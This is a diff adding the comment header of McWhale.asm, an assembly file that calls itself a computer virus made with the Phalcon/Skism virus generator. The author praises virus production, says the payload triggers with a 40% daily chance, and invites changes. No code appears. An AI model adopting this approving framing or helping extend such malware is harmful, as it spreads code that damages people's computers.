@@ -1,0 +1,12 @@
+; McWhale.asm : [McAfee' Whale] by [pAgE]
+; Created wik the Phalcon/Skism Mass-Produced Code Generator
+; from the configuration file skeleton.cfg
+;
+; Here's another "lame dick" virus! I thought it was rather fitting!
+; Many thanks to the fellows at Phalcon/Skism for this little tool.
+; I am sure that Dark Angel and the bunch are not stopping here, but
+; will come up with another innovation in Vx production...
+;
+; I have set this file to activate at a 40% chance on any day. Feel free
+; to modify this program as you see fit or keep it as a novelty in its
+; original form.
